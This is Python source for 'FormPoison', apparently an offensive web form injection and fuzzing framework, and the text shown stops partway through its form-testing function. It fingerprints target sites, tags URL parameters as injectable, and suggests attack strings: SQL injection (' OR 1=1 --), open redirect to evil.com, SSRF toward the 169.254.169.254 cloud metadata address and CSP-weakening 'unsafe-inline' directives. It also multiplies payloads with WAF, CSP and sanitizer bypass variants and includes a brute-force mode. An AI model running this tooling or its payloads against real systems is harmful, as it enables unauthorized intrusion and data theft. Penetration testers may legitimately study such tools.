import aiohttp
import socket
from datetime import datetime
import asyncio
import json
import itertools
from rich.console import Console
from rich.table import Table
import argparse
import sys
import random
from bs4 import BeautifulSoup
import re
import time
from threading import Thread, Event
import threading
from selenium import webdriver
from selenium.webdriver.common.by import By
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
import ssl
import signal
import subprocess
import os
import tempfile
from pathlib import Path
import html as html_module
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from typing import Dict, List, Optional, Tuple, Set
from functions import *
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# Ctrl+C
def handle_sigint(signum, frame):
    console.print("[bold red]Received Ctrl+C. Shutting down gracefully...[/bold red]")
    sys.exit(0)

signal.signal(signal.SIGINT, handle_sigint)


######################### ENHANCED XSS DETECTION MODULE ###################
class XSSExecutionDetector:
    """
    Context-aware XSS execution detection to minimize false positives.
    Only flags XSS when the payload appears in an actually executable context.
    """
    
    def __init__(self):
        self.executable_event_handlers = [
            'onerror', 'onload', 'onclick', 'onmouseover', 'onmouseout',
            'onfocus', 'onblur', 'onchange', 'onsubmit', 'onkeydown',
            'onkeyup', 'onkeypress', 'ondblclick', 'oncontextmenu',
            'oninput', 'oninvalid', 'onsearch', 'onselect', 'ontoggle',
            'onanimationend', 'onanimationstart', 'oncopy', 'oncut', 'onpaste'
        ]
        
        self.js_protocol_attributes = ['href', 'src', 'action', 'formaction', 'data']
        self.dangerous_svg_elements = ['use', 'animate', 'set', 'animateMotion', 'animateTransform']
        
    def find_executable_script_injection(self, soup, payload):
        for script in soup.find_all('script'):
            if script.get('type') and script['type'] not in ['', 'text/javascript', 'application/javascript', 'module']:
                continue
                
            if script.string and ('alert(' in script.string or 'confirm(' in script.string or 'prompt(' in script.string):
                parent = script.parent
                if parent and parent.name in ['textarea', 'xmp', 'noscript']:
                    continue
                    
                script_str = str(script)
                if not ('<!--' in script_str and '-->' in script_str and 'alert(' in script_str[script_str.find('<!--'):script_str.find('-->')]):
                    return True
        return False
    
    def find_executable_event_handler(self, soup, payload):
        for tag in soup.find_all(True):
            for attr_name, attr_value in tag.attrs.items():
                if attr_name.lower() in self.executable_event_handlers:
                    if isinstance(attr_value, str) and ('alert(' in attr_value or 'confirm(' in attr_value or 'prompt(' in attr_value):
                        if not self._is_in_non_executable_context(tag, soup):
                            return True
                            
                elif attr_name.lower() in self.js_protocol_attributes:
                    if isinstance(attr_value, str) and attr_value.strip().lower().startswith('javascript:'):
                        if 'alert(' in attr_value or 'confirm(' in attr_value or 'prompt(' in attr_value:
                            if not self._is_in_non_executable_context(tag, soup):
                                return True
        return False
    
    def find_executable_svg_xss(self, soup, payload):
        for svg in soup.find_all('svg'):
            for child in svg.find_all(True):
                for attr_name in child.attrs:
                    if attr_name.lower() in self.executable_event_handlers:
                        if 'alert(' in str(child[attr_name]):
                            return True
            
            for script in svg.find_all('script'):
                if script.string and 'alert(' in script.string:
                    return True
                    
            for elem_name in self.dangerous_svg_elements:
                for elem in svg.find_all(elem_name):
                    for attr_name in elem.attrs:
                        if attr_name.lower() in self.executable_event_handlers:
                            if 'alert(' in str(elem[attr_name]):
                                return True
        return False
    
    def find_executable_mathml_xss(self, soup, payload):
        for math in soup.find_all('math'):
            for script in math.find_all('script'):
                if script.string and 'alert(' in script.string:
                    return True
            
            for tag in math.find_all(True):
                for attr_name in tag.attrs:
                    if attr_name.lower() in self.executable_event_handlers:
                        if 'alert(' in str(tag[attr_name]):
                            return True
        return False
    
    def find_template_injection(self, soup, payload):
        for template in soup.find_all(['template', 'noscript']):
            template.decompose()
        
        remaining_html = str(soup)
        dangerous_patterns = [
            '<script>alert(',
            'onerror=alert(',
            'onload=alert(',
            'javascript:alert(',
            '<img src=x onerror=alert(',
            '<svg onload=alert(',
            '<body onload=alert('
        ]
        
        for pattern in dangerous_patterns:
            if pattern in remaining_html:
                temp_soup = BeautifulSoup(remaining_html, 'html.parser')
                if (self.find_executable_script_injection(temp_soup, payload) or
                    self.find_executable_event_handler(temp_soup, payload)):
                    return True
        return False
    
    def _is_in_non_executable_context(self, tag, soup):
        non_executable_parents = ['textarea', 'xmp', 'noscript', 'template']
        
        parent = tag.parent
        while parent:
            if parent.name in non_executable_parents:
                return True
            parent = parent.parent
        
        tag_str = str(tag)
        if '<!--' in tag_str and '-->' in tag_str:
            comment_start = tag_str.find('<!--')
            comment_end = tag_str.find('-->')
            if comment_start < tag_str.find(str(tag)) < comment_end:
                return True
        
        if '<![CDATA[' in tag_str and ']]>' in tag_str:
            return True
        
        return False
    
    def is_xss_executed(self, html_content, payload, content_type=None):
        if content_type and 'html' not in content_type.lower():
            return False
        
        if not html_content or not payload:
            return False
        
        if not self._is_payload_reflected_enhanced(html_content, payload):
            return False
        
        try:
            soup = BeautifulSoup(html_content, 'html.parser')
            
            if self.find_executable_script_injection(soup, payload):
                return True
            if self.find_executable_event_handler(soup, payload):
                return True
            if self.find_executable_svg_xss(soup, payload):
                return True
            if self.find_executable_mathml_xss(soup, payload):
                return True
            if self.find_template_injection(soup, payload):
                return True
            
        except Exception as e:
            pass
        
        return False
    
    def _is_payload_reflected_enhanced(self, content, payload):
        if not payload or len(payload) < 3:
            return False
        
        if payload in content:
            return True
        
        payload_clean = re.sub(r'[%\+]', '', payload)
        content_clean = re.sub(r'[%\+]', '', content)
        
        if len(payload_clean) > 10 and payload_clean in content_clean:
            return True
        
        decoded_content = html_module.unescape(content)
        if payload in decoded_content:
            return True
        
        payload_parts = payload.split()
        if len(payload_parts) > 1:
            all_parts_found = all(part in content or part in decoded_content for part in payload_parts)
            if all_parts_found:
                return True
        
        return False


# Initialize the detector
xss_detector = XSSExecutionDetector()


######################### URL PARAMETER ANALYZER ###################
class URLParameterAnalyzer:
    def __init__(self, console):
        self.console = console
        
    def analyze_url(self, url):
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        results = {
            'url': url,
            'total_params': len(params),
            'injectable_params': [],
            'csp_injection_points': [],
            'waf_injection_points': [],
            'open_redirect_params': [],
            'ssrf_params': [],
            'sql_injection_params': []
        }
        
        csp_keywords = ['token', 'nonce', 'csp', 'policy', 'script', 'src', 'style', 'callback']
        waf_keywords = ['input', 'data', 'query', 'search', 'filter', 'sort', 'order']
        redirect_keywords = ['redirect', 'url', 'next', 'return', 'goto', 'target', 'continue', 'back']
        ssrf_keywords = ['url', 'path', 'proxy', 'fetch', 'request', 'endpoint', 'api', 'host']
        sql_keywords = ['id', 'user', 'query', 'search', 'filter', 'sort', 'order', 'page', 'cat']
        
        for param_name, param_values in params.items():
            param_lower = param_name.lower()
            param_info = {
                'name': param_name,
                'values': param_values,
                'types': []
            }
            
            if any(keyword in param_lower for keyword in csp_keywords):
                param_info['types'].append('CSP_INJECTION')
                param_info['csp_payload'] = f"&{param_name}=;script-src-elem 'unsafe-inline'"
                results['csp_injection_points'].append(param_info)
            
            if any(keyword in param_lower for keyword in waf_keywords):
                param_info['types'].append('WAF_BYPASS')
                results['waf_injection_points'].append(param_info)
            
            if any(keyword in param_lower for keyword in redirect_keywords):
                param_info['types'].append('OPEN_REDIRECT')
                results['open_redirect_params'].append(param_info)
            
            if any(keyword in param_lower for keyword in ssrf_keywords):
                param_info['types'].append('SSRF')
                results['ssrf_params'].append(param_info)
            
            if any(keyword in param_lower for keyword in sql_keywords):
                param_info['types'].append('SQL_INJECTION')
                results['sql_injection_params'].append(param_info)
            
            for value in param_values:
                value_lower = value.lower()
                if re.search(r'[a-z]+-[a-z]+', value_lower):
                    param_info['types'].append('CSP_LIKE_VALUE')
                if any(sep in value for sep in [';', ',', ' ', '%20', '+']):
                    param_info['types'].append('SEPARATOR_IN_VALUE')
            
            if param_info['types']:
                results['injectable_params'].append(param_info)
        
        return results
    
    def generate_csp_bypass_url(self, url, param_name, directive="script-src-elem", value="'unsafe-inline'"):
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if param_name in params:
            original_value = params[param_name][0]
            params[param_name] = [f"{original_value};{directive} {value}"]
        
        new_query = urlencode(params, doseq=True)
        new_url = urlunparse(parsed._replace(query=new_query))
        
        return new_url
    
    def display_analysis(self, results):
        if not results['injectable_params']:
            self.console.print("[yellow]No injectable parameters found in URL[/yellow]")
            return
        
        table = Table(title="URL Parameter Analysis")
        table.add_column("Parameter", style="cyan")
        table.add_column("Potential Vulnerabilities", style="yellow")
        table.add_column("Suggested Attack", style="red")
        
        for param in results['injectable_params']:
            param_name = param['name']
            vuln_types = ', '.join(param['types'])
            
            suggested = []
            if 'CSP_INJECTION' in param['types']:
                suggested.append(f"&{param_name}=;script-src-elem 'unsafe-inline'")
            if 'SQL_INJECTION' in param['types']:
                suggested.append(f"{param_name}=' OR 1=1 --")
            if 'OPEN_REDIRECT' in param['types']:
                suggested.append(f"&{param_name}=https://evil.com")
            if 'SSRF' in param['types']:
                suggested.append(f"&{param_name}=http://169.254.169.254/")
            
            table.add_row(param_name, vuln_types, '\n'.join(suggested[:2]))
        
        self.console.print(table)
        
        self.console.print(f"[bold green]Found {len(results['injectable_params'])} injectable parameters[/bold green]")
        
        if results['csp_injection_points']:
            self.console.print(f"[bold red]CSP Injection Points: {len(results['csp_injection_points'])}[/bold red]")
            for point in results['csp_injection_points']:
                self.console.print(f"  [yellow]-> {point['name']}: {point.get('csp_payload', '')}[/yellow]")
        
        if results['sql_injection_params']:
            self.console.print(f"[bold red]SQL Injection Parameters: {len(results['sql_injection_params'])}[/bold red]")
        
        if results['open_redirect_params']:
            self.console.print(f"[bold red]Open Redirect Parameters: {len(results['open_redirect_params'])}[/bold red]")
        
        if results['ssrf_params']:
            self.console.print(f"[bold red]SSRF Parameters: {len(results['ssrf_params'])}[/bold red]")


######################### GO SCANNER INTEGRATION ###################
class GoScannerIntegration:
    def __init__(self):
        self.scanner_path = self.find_go_scanner()
        self.console = Console()
        
        self.vuln_to_payload_mapping = {
            'sql_injection': ['SQL'],
            'length_validator': ['SQL', 'Java'],
            'size_validator': ['SQL', 'Java'],
            'array_index_check': ['SQL', 'Java'],
            'xss': ['HTML', 'XSS'],
            'equals_type_check': ['HTML', 'Java'],
            'type_casting': ['HTML', 'Java'],
            'command_injection': ['Java', 'Command'],
            'file_handling': ['Java', 'Path'],
            'network_io': ['Java'],
            'insecure_deserialization': ['Java', 'Serialization'],
            'reflection': ['Java'],
            'serialization': ['Java'],
            'instanceof_check': ['Java'],
            'null_check': ['Java'],
            'boundary_check': ['Java'],
            'regex_validation': ['Java'],
            'unchecked_exception': ['Java'],
            'string_concatenation': ['Java', 'SQL'],
            'date_handling': ['Java'],
            'enum_usage': ['Java'],
            'annotation_usage': ['Java'],
            'lambda_expression': ['Java'],
            'stream_usage': ['Java'],
            'optional_usage': ['Java'],
            'concurrency': ['Java'],
            'resource_management': ['Java'],
            'type_confusion': ['Java'],
            'race_condition': ['Java'],
            'insecure_randomness': ['Java'],
            'path_traversal': ['Path', 'Java']
        }

    def find_go_scanner(self):
        possible_paths = [
            './scanner', './vulnerability-scanner',
            '/usr/local/bin/scanner', '/usr/bin/scanner', 'scanner.exe'
        ]
        for path in possible_paths:
            if os.path.exists(path):
                return path
        try:
            result = subprocess.run(['which', 'scanner'], capture_output=True, text=True)
            if result.returncode == 0:
                return result.stdout.strip()
        except:
            pass
        return None

    def run_go_scanner(self, url, max_urls=100, max_depth=3, workers=10, proxy_url=None):
        if not self.scanner_path:
            self.console.print("[bold red]Go scanner not found![/bold red]")
            self.console.print("Please compile the Go scanner first:")
            self.console.print("1. go mod init vulnerability-scanner")
            self.console.print("2. go mod tidy") 
            self.console.print("3. go build -o scanner")
            self.console.print("checking basic technology instead")
            return None

        try:
            cmd = [self.scanner_path, url, str(max_urls), str(max_depth), str(workers)]
            if proxy_url:
                cmd.append(f"--proxy={proxy_url}")

            self.console.print(f"[bold green]Running Go scanner...[/bold green]")
            self.console.print("[yellow]Be patient during scan...[/yellow]")

            stop_animation = Event()

            def animation():
                spinner = itertools.cycle(['|', '/', '-', '\\'])
                start_time = time.time()
                while not stop_animation.is_set():
                    elapsed = int(time.time() - start_time)
                    minutes, seconds = divmod(elapsed, 60)
                    time_str = f"{minutes:02d}:{seconds:02d}"
                    self.console.print(f"[cyan]{next(spinner)}[/cyan] Scanning... [dim](Time: {time_str})[/dim]", end="\r")
                    time.sleep(0.2)

            animation_thread = Thread(target=animation)
            animation_thread.daemon = True
            animation_thread.start()

            result = subprocess.run(cmd, capture_output=True, text=True, timeout=3600)

            stop_animation.set()
            if animation_thread:
                animation_thread.join(timeout=1.0)
            self.console.print(" " * 100, end="\r")

            if result.returncode == 0:
                output_lines = result.stdout.strip().split('\n')
                if output_lines:
                    report_file = output_lines[-1].strip()
                    if report_file and os.path.exists(report_file):
                        self.console.print("[green]Scan completed successfully![/green]")
                        return report_file
            else:
                self.console.print(f"[bold red]Scanner error: {result.stderr}[/bold red]")

        except subprocess.TimeoutExpired:
            stop_animation.set()
            self.console.print("[bold red]Scanner timeout after 1h![/bold red]")
        except Exception as e:
            stop_animation.set()
            self.console.print(f"[bold red]Scanner error: {e}[/bold red]")
        finally:
            stop_animation.set()

        return None

    def parse_scan_report(self, report_file):
        if not report_file:
            return None
        try:
            with open(report_file, 'r', encoding='utf-8') as f:
                return json.load(f)
        except:
            return None

    def generate_attack_recommendations(self, scan_report):
        recommendations = []
        if not scan_report or 'vulnerabilities' not in scan_report:
            return recommendations

        attack_mapping = {
            'sql_injection': ["SQL Injection - Standard SQLi payloads", "Blind SQL Injection", "Time-based SQL Injection"],
            'xss': ["XSS - Standard XSS payloads", "DOM-based XSS", "Stored XSS", "Reflected XSS"],
            'command_injection': ["Command Injection - OS command execution", "Remote code execution"],
            'path_traversal': ["Path Traversal - Directory traversal", "Local file inclusion"],
            'insecure_deserialization': ["Insecure Deserialization - Malicious object deserialization"],
        }

        vuln_types = set()
        for vuln in scan_report['vulnerabilities']:
            vuln_types.add(vuln['pattern'])

        for vuln_type in vuln_types:
            if vuln_type in attack_mapping:
                recommendations.extend(attack_mapping[vuln_type])

        return list(set(recommendations))

    def scan_and_analyze(self, url, max_urls=100, max_depth=3, workers=10, proxy_url=None):
        self.console.print(f"[bold blue]Starting Go scanner for: {url}[/bold blue]")
        report_file = self.run_go_scanner(url, max_urls, max_depth, workers, proxy_url)

        if not report_file:
            return [], []

        scan_report = self.parse_scan_report(report_file)
        if not scan_report:
            return [], []

        self.console.print(f"[bold green]Scan completed![/bold green]")
        recommendations = self.generate_attack_recommendations(scan_report)

        if recommendations:
            self.console.print("[bold green]Attack recommendations:[/bold green]")
            for recommendation in recommendations:
                self.console.print(f"[yellow]- {recommendation}[/yellow]")

        return scan_report, recommendations

    def map_vulnerabilities_to_payloads(self, scan_report, all_payloads):
        targeted_payloads = []
        vulnerability_categories = set()
        
        if not scan_report or 'vulnerabilities' not in scan_report:
            return all_payloads, vulnerability_categories

        for vuln in scan_report['vulnerabilities']:
            vuln_type = vuln['pattern']
            vulnerability_categories.add(vuln_type)
            
            if vuln_type in self.vuln_to_payload_mapping:
                payload_categories = self.vuln_to_payload_mapping[vuln_type]
                for payload in all_payloads:
                    if payload['category'] in payload_categories:
                        enhanced_payload = payload.copy()
                        enhanced_payload['targeted_vulnerability'] = vuln_type
                        targeted_payloads.append(enhanced_payload)

        if not targeted_payloads:
            return all_payloads, vulnerability_categories
        
        unique_payloads = {}
        for payload in targeted_payloads:
            key = payload['inputField']
            if key not in unique_payloads:
                unique_payloads[key] = payload
        
        return list(unique_payloads.values()), vulnerability_categories

    def generate_context_aware_payloads(self, scan_report, base_payloads, bypass_flags=None):
        targeted_payloads, vuln_categories = self.map_vulnerabilities_to_payloads(scan_report, base_payloads)
        enhanced_payloads = self.apply_bypass_techniques(targeted_payloads, scan_report, bypass_flags)
        
        self.console.print(f"[green]Targeted payloads: {len(enhanced_payloads)}[/green]")
        return enhanced_payloads

    def apply_bypass_techniques(self, payloads, scan_report, bypass_flags):
        enhanced_payloads = []
        for payload in payloads:
            enhanced_payloads.append(payload)
            vuln_type = payload.get('targeted_vulnerability', '')
            
            if bypass_flags.get('waf_bypass') and any(inj in vuln_type.lower() for inj in ['injection', 'xss', 'sql']):
                bypassed = waf_bypass.generate_bypassed_payloads(payload['inputField'], 2)
                for bp in bypassed:
                    enhanced_payload = payload.copy()
                    enhanced_payload['inputField'] = bp
                    enhanced_payload['category'] = payload['category'] + '_WAF_BYPASS'
                    enhanced_payloads.append(enhanced_payload)

            if bypass_flags.get('csp_bypass') and payload['category'] in ['HTML', 'XSS']:
                bypassed = csp_bypass.generate_csp_bypass_payloads(payload['inputField'], 2)
                for bp in bypassed:
                    enhanced_payload = payload.copy()
                    enhanced_payload['inputField'] = bp
                    enhanced_payload['category'] = payload['category'] + '_CSP_BYPASS'
                    enhanced_payloads.append(enhanced_payload)

            if bypass_flags.get('sanitizer_bypass'):
                bypassed = sanitizer_bypass.generate_sanitizer_bypass_payloads(payload['inputField'], 2)
                for bp in bypassed:
                    enhanced_payload = payload.copy()
                    enhanced_payload['inputField'] = bp
                    enhanced_payload['category'] = payload['category'] + '_SANITIZER_BYPASS'
                    enhanced_payloads.append(enhanced_payload)

        return enhanced_payloads


######################### DETECTIONS ###################
def detect_framework(headers, content):
    framework_detected = None
    version = None
    content_lower = content.lower() if content else ""

    framework_indicators = {
        'Express.js': {
            'headers': [('x-powered-by', r'express(?:\.js)?/?(\d+\.\d+\.\d+)?')],
            'cookies': ['connect.sid'],
        },
        'Laravel': {
            'headers': [('x-powered-by', r'laravel/?(\d+\.\d+\.\d+)?')],
            'cookies': ['laravel_session'],
        },
        'Django': {
            'cookies': ['csrftoken', 'sessionid'],
            'content_patterns': [r'csrfmiddlewaretoken']
        },
        'Flask': {
            'cookies': ['session']
        },
        'ASP.NET': {
            'headers': [('x-powered-by', r'asp\.net'), ('x-aspnet-version', r'(\d+\.\d+\.\d+)')],
            'content_patterns': [r'__VIEWSTATE', r'__EVENTVALIDATION']
        },
    }

    for framework, indicators in framework_indicators.items():
        for header_name, pattern in indicators.get('headers', []):
            if header_name in headers:
                header_value = headers[header_name].lower()
                match = re.search(pattern, header_value, re.IGNORECASE)
                if match:
                    return framework, match.group(1) if match.groups() else None

        if 'cookies' in indicators:
            cookie_header = headers.get('set-cookie', '').lower()
            for cookie_name in indicators['cookies']:
                if cookie_name.lower() in cookie_header:
                    return framework, None

    return framework_detected, version

def detect_cms(content):
    content_lower = content.lower()
    if '/wp-content/' in content_lower or '/wp-admin/' in content_lower:
        return 'WordPress', None
    elif '/media/jui/' in content_lower:
        return 'Joomla', None
    elif '/sites/default/' in content_lower:
        return 'Drupal', None
    elif '/skin/frontend/' in content_lower:
        return 'Magento', None
    elif 'shopify' in content_lower:
        return 'Shopify', None
    return None, None

def detect_libraries(content):
    libraries_detected = []
    content_lower = content.lower()
    
    libs = {
        'bootstrap.min.css': 'Bootstrap',
        'tailwind.min.css': 'Tailwind CSS',
        'jquery.min.js': 'jQuery',
        'lodash.min.js': 'Lodash',
        'materialize.min.css': 'Materialize',
        'foundation.min.css': 'Foundation',
        'bulma.min.css': 'Bulma',
        'semantic.min.css': 'Semantic UI',
        'moment.min.js': 'Moment.js',
        'chart.min.js': 'Chart.js',
        'vue.js': 'Vue.js',
        'react.js': 'React',
    }
    
    for key, name in libs.items():
        if key in content_lower:
            libraries_detected.append((name, None))
    
    return libraries_detected

def detect_server_technology(headers):
    if 'Server' in headers:
        server = headers['Server'].lower()
        if 'apache' in server:
            return 'Apache', None
        elif 'nginx' in server:
            return 'Nginx', None
        elif 'iis' in server:
            return 'IIS', None
    return None, None

def detect_cdn(headers):
    if 'Server' in headers:
        server = headers['Server'].lower()
        if 'cloudflare' in server:
            return 'Cloudflare', None
        elif 'akamai' in server:
            return 'Akamai', None
        elif 'aws' in server:
            return 'AWS CloudFront', None
    return None, None

def detect_ssl(url):
    import socket
    from datetime import datetime
    try:
        hostname = url.split('//')[1].split('/')[0]
        context = ssl.create_default_context()
        with socket.create_connection((hostname, 443)) as sock:
            with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                cert = ssock.getpeercert()
        expire_date = datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
        issuer = dict(x[0] for x in cert['issuer'])['organizationName']
        return f"Valid until {expire_date}, Issuer: {issuer}"
    except:
        return None


console = Console()
go_scanner = GoScannerIntegration()
url_analyzer = URLParameterAnalyzer(console)


async def scan_website(url, headers, content):
    results = []
    framework_detected, framework_version = detect_framework(headers, content)
    if framework_detected:
        results.append(("Framework", f"{framework_detected} (v{framework_version})" if framework_version else framework_detected))

    libraries_detected = detect_libraries(content)
    if libraries_detected:
        libs_info = [f"{lib}" for lib, _ in libraries_detected]
        results.append(("Libraries", ", ".join(libs_info)))

    cms_detected, _ = detect_cms(content)
    if cms_detected:
        results.append(("CMS", cms_detected))

    server_tech, _ = detect_server_technology(headers)
    if server_tech:
        results.append(("Server Technology", server_tech))

    cdn_detected, _ = detect_cdn(headers)
    if cdn_detected:
        results.append(("CDN", cdn_detected))

    ssl_info = detect_ssl(url)
    if ssl_info:
        results.append(("SSL/TLS", ssl_info))

    return results

async def scan(url, proxies=None):
    headers = {'User-Agent': 'FormPoison 1.0.'}
    try:
        ssl_context = ssl.create_default_context()
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=ssl_context)) as session:
            async with session.get(url, headers=headers) as response:
                content = await response.text()
                headers = response.headers
                results = await scan_website(url, headers, content)

                table = Table(title="Scan Results")
                table.add_column("Category", style="cyan")
                table.add_column("Value", style="magenta")
                for category, value in results:
                    table.add_row(category, value)
                console.print(table)
    except Exception as e:
        console.print(f"[bold red]Error scanning {url}: {e}[/bold red]")


def sanitize_user_agent(user_agent):
    return re.sub(r'[^\x00-\x7F]+', '', user_agent)

def show_banner():
    staticbanner = """
  Form                                 .--.
      Poison                  ,-.------+-.|  ,-.
                  ,--=======* )"("")===)===* )
                              `-"---==-+-"|  `-"
                                       '--'
              Input fields and forms injection framework.
              Developed by: https://github.com/csshark
                                                v. 1.0.1.
    """
    print(staticbanner)
    print("Framework Initialization Done.")

def parse_cookies(cookie_str):
    cookies = {}
    if cookie_str:
        for pair in cookie_str.split(';'):
            if '=' in pair:
                key, value = pair.strip().split('=', 1)
                cookies[key] = value
    return cookies

def parse_proxy(proxy_url):
    if not proxy_url:
        return None

    if "@" in proxy_url:
        proxy_parts = proxy_url.split("://")[1].split("@")
        auth_part = proxy_parts[0]
        proxy_domain = proxy_parts[1]
        proxy_url = f"http://{proxy_domain}"
        proxies = {"http": f"http://{auth_part}@{proxy_domain}", "https": f"https://{auth_part}@{proxy_domain}"}
    else:
        proxies = {"http": proxy_url, "https": proxy_url}

    return proxies

def load_payloads(file_path, bypass_flags=None, url=None):
    try:
        with open(file_path, 'r') as f:
            payloads = json.load(f)

        if bypass_flags:
            enhanced_payloads = []
            for payload in payloads:
                enhanced_payloads.append(payload)

                if bypass_flags.get('waf_bypass'):
                    bypassed = waf_bypass.generate_bypassed_payloads(payload['inputField'], 3)
                    for bp in bypassed:
                        enhanced_payloads.append({'inputField': bp, 'category': payload['category'] + '_WAF_BYPASS'})

                if bypass_flags.get('csp_bypass') and payload['category'] in ['HTML', 'XSS']:
                    if url:
                        bypassed = csp_bypass.generate_url_aware_csp_payloads(url, payload['inputField'], 3)
                    else:
                        bypassed = csp_bypass.generate_csp_bypass_payloads(payload['inputField'], 2)
                    for bp in bypassed:
                        enhanced_payloads.append({'inputField': bp, 'category': payload['category'] + '_CSP_BYPASS'})

                if bypass_flags.get('sanitizer_bypass'):
                    bypassed = sanitizer_bypass.generate_sanitizer_bypass_payloads(payload['inputField'], 3)
                    for bp in bypassed:
                        enhanced_payloads.append({'inputField': bp, 'category': payload['category'] + '_SANITIZER_BYPASS'})

                if bypass_flags.get('encoder_bypass'):
                    bypassed = encoder_bypass.generate_encoding_confusion(payload['inputField'], 2)
                    for bp in bypassed:
                        enhanced_payloads.append({'inputField': bp, 'category': payload['category'] + '_ENCODER_BYPASS'})

                if bypass_flags.get('encoding_confusion'):
                    confused = encoder_bypass.generate_encoding_confusion(payload['inputField'], 3)
                    for cf in confused:
                        enhanced_payloads.append({'inputField': cf, 'category': payload['category'] + '_ENCODING_CONFUSION'})

                if bypass_flags.get('size_overflow'):
                    overflowed = size_overflow.generate_overflow_payloads(payload['inputField'], 2)
                    for of in overflowed:
                        enhanced_payloads.append({'inputField': of, 'category': payload['category'] + '_SIZE_OVERFLOW'})

            return enhanced_payloads

        return payloads

    except FileNotFoundError:
        console.print(f"[bold red]Error: Payload file '{file_path}' not found.[/bold red]")
        sys.exit(1)
    except json.JSONDecodeError:
        console.print(f"[bold red]Error: Invalid JSON in payload file '{file_path}'.[/bold red]")
        sys.exit(1)

def filter_payloads(payloads, filter_patterns):
    if not filter_patterns:
        return payloads

    filtered_payloads = []
    for payload in payloads:
        for pattern in filter_patterns:
            if pattern.lower() in payload['inputField'].lower():
                filtered_payloads.append(payload)
                break

    return filtered_payloads

async def get_page_content(url, user_agent, proxies=None, ssl_cert=None, ssl_key=None, ssl_verify=False):
    headers = {'User-Agent': sanitize_user_agent(user_agent)}
    try:
        ssl_context = ssl.create_default_context()
        if ssl_cert and ssl_key:
            ssl_context.load_cert_chain(ssl_cert, ssl_key)
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=ssl_context)) as session:
            async with session.get(url, headers=headers, proxy=proxies.get('http') if proxies else None, ssl=ssl_verify) as response:
                return await response.text()
    except Exception as e:
        console.print(f"[bold red]Error fetching page: {e}[/bold red]")
        return None


def is_payload_reflected(content, payload):
    """Basic reflection check"""
    if not payload or len(payload) < 3:
        return False
    
    if payload in content:
        return True
    
    payload_clean = re.sub(r'[%\+]', '', payload)
    content_clean = re.sub(r'[%\+]', '', content)
    
    if len(payload_clean) > 10 and payload_clean in content_clean:
        return True
    
    return False


def is_payload_executed(content, payload, response_headers, status_code, content_type=None):
    """
    ENHANCED: Context-aware payload execution validation.
    Significantly reduces false positives by analyzing actual executable contexts.
    """
    content_lower = content.lower() if content else ""
    execution_indicators = []
    
    # Check if payload is reflected using enhanced detection
    reflected = xss_detector._is_payload_reflected_enhanced(content, payload)
    
    # Server errors - useful for fuzzing but NOT XSS
    if status_code and status_code >= 500:
        execution_indicators.append(f"ERROR_{status_code}")
    
    # SQL errors - keep separate from XSS
    sql_errors = [
        "sql syntax", "mysql_fetch", "ora-", "postgresql", "sqlite3",
        "unclosed quotation", "division by zero", "sql error",
        "warning: mysql", "microsoft ole db", "odbc drivers",
        "mysql_num_rows", "mysql_query", "pg_query"
    ]
    if any(error in content_lower for error in sql_errors):
        execution_indicators.append("SQL_ERROR")
    
    # CONTEXT-AWARE XSS DETECTION - Only flag if actually executable
    if reflected:
        xss_executed = xss_detector.is_xss_executed(content, payload, content_type)
        if xss_executed:
            execution_indicators.append("XSS_EXECUTED")
    
    return reflected, execution_indicators


def analyze_response(content, headers, payload_category, payload, status_code, verbose_all=False):
    """Enhanced response analysis with improved categorization"""
    vulnerabilities = []
    
    # Get content type for context-aware analysis
    content_type = headers.get('Content-Type', '')
    
    # SQL error detection (separate from XSS)
    sql_errors = [
        "sql syntax", "mysql_fetch", "ora-", "postgresql", "sqlite3",
        "unclosed quotation", "division by zero", "microsoft ole db",
        "odbc drivers", "mysql_num_rows", "mysql_query", "pg_query"
    ]
    if any(error in content.lower() for error in sql_errors):
        vulnerabilities.append("SQL_ERROR_DETECTED")
    
    # Context-aware XSS detection
    reflected, execution_indicators = is_payload_executed(
        content, payload, headers, status_code, content_type
    )
    
    if reflected:
        vulnerabilities.append("PAYLOAD_REFLECTED")
    
    # Only add execution indicators that are meaningful
    for indicator in execution_indicators:
        if indicator in ['XSS_EXECUTED', 'SQL_ERROR']:
            vulnerabilities.append(indicator)
        elif indicator.startswith('ERROR_'):
            vulnerabilities.append(indicator)
    
    # Server information (useful for fingerprinting)
    if "Server" in headers:
        vulnerabilities.append(f"Server: {headers['Server']}")
    if "X-Powered-By" in headers:
        vulnerabilities.append(f"X-Powered-By: {headers['X-Powered-By']}")
    
    # Confidence calculation based on actual execution context
    if 'XSS_EXECUTED' in execution_indicators:
        confidence = "VERY_HIGH" if reflected else "HIGH"
        vulnerabilities.append(f"CONFIDENCE_{confidence}")
    elif 'SQL_ERROR' in execution_indicators:
        vulnerabilities.append("CONFIDENCE_HIGH")
    elif reflected:
        vulnerabilities.append("CONFIDENCE_LOW")
    
    return vulnerabilities


def get_string_input_fields(content):
    soup = BeautifulSoup(content, 'html.parser')
    input_fields = soup.find_all('input', {'type': ['text', 'password', 'email', 'search', 'tel', 'url', 'query']})

    filtered_inputs = []
    for field in input_fields:
        field_type = field.get('type', '').lower()
        if field_type not in ['checkbox', 'radio', 'hidden', 'submit', 'button', 'reset', 'file', 'image']:
            filtered_inputs.append(field)

    textareas = soup.find_all('textarea')
    return filtered_inputs + textareas


async def test_all_forms(url, payloads, threat_type, cookies, user_agents, method="POST", 
                        proxies=None, ssl_cert=None, ssl_key=None, filter=None, ssl_verify=False, 
                        verbose=False, verbose_all=False, secs=0, brute_mode=False, 
                        max_concurrent=50, timeout=15.0, batch_size=100, batch_delay=1.0, max_retries=2):
    
    results = [] 
    initial_user_agent = user_agents[0] if user_agents else "FormPoison/v.1.0.1"
    content = await get_page_content(url, initial_user_agent, proxies, ssl_cert, ssl_key, ssl_verify)

    if not content:
        console.print("[bold red]Failed to fetch page content[/bold red]")
        return results

    soup = BeautifulSoup(content, 'html.parser')
    forms = soup.find_all('form')

    console.print(f"[bold green]Found {len(forms)} forms to test[/bold green]")

    if brute_mode:
        console.print(f"[bold red]BRUTE FORCE MODE ACTIVATED[/bold red]")
